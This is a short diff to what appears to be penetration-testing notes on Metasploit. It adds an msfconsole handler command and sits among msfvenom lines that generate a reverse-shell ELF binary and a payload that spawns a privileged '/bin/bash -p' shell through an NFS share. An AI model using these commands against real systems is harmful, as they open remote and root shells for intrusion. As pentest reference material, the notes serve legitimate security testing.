@@ -6,6 +6,9 @@ msfvenom to generate a reverse shell ELF binary: `msfvenom -p linux/x64/shell_re
 generate a payload using msfvenom callnig /bin/bash:
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 
+---- MSF Console
+msf exploit(handler) > exploit -k -z
+
 ---- Jobs
 Launch the attack as a job with the command 'run -j'.
 * jobs
